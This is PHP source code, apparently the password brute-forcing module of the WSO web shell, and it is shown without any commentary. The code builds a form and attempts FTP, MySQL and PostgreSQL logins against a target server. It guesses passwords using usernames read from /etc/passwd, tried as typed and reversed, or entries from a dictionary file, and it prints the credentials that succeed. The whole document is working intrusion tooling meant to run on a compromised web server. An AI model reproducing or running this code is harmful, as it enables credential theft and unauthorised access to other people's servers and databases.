<?php
function actionBruteforce() {
	wsoHeader();
	if( isset($_POST['proto']) ) {
		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
		if( $_POST['proto'] == 'ftp' ) {
			function wsoBruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function wsoBruteForce($ip,$port,$login,$pass) {
				$res = @mysql_connect($ip.':'.($port?$port:3306), $login, $pass);
				@mysql_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function wsoBruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
				$res = @pg_connect($str);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( wsoBruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i>=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( wsoBruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
					}
				}
		}
		echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
	}
	echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
		.'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>'
		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
		.'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
		.'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
		.'<span>Server:port</span></td>'
		.'<td><input type=text name=server value="127.0.0.1"></td></tr>'
		.'<tr><td><span>Brute type</span></td>'
		.'<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>'
		.'<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>'
		.'<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>'
		.'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
		.'<td><input type=text name=login value="root"></td></tr>'
		.'<tr><td><span>Dictionary</span></td>'
		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
		.'</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
	echo '</div><br>';
	wsoFooter();
}